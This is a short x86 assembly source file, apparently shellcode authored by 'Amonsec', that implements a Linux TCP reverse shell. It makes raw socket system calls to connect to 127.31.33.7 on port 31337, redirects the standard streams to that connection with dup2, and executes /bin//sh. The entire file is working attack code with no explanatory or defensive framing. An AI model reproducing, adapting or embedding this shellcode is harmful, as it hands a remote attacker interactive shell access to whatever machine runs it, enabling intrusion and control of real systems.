; Author: Amonsec
; Linux TCP reverse shell

global _start

section .text
_start:

  ; Socket creation
  xor ebx, ebx
  xor eax, eax
  xor ecx, ecx
  xor edx, edx
  inc ebx

  push edx

  push ebx
  push byte 0x2

  mov ecx, esp
  mov al, 0x66
  int 0x80
  xchg esi, eax


  ; Connect
  inc ebx

  push 0x07211f7f   ; 127.31.33.07
  push word 0x697a  ; 31337
  push bx
  mov ecx, esp

  push byte 0x10
  push ecx
  push esi

  mov ecx, esp
  inc ebx
  mov al, 0x66
  int 0x80


  ; Dup2
  xor ecx, ecx
  xchg ebx, esi

dup:
  mov al, 0x3f
  int 0x80
  inc ecx
  cmp ecx, 0x3
  jne dup

  push edx
  push 0x68732f2f ; hs//
  push 0x6e69622f ; nib/
  mov ebx, esp
  
  mov ecx, edx

  mov al, 0x0b
  int 0x80
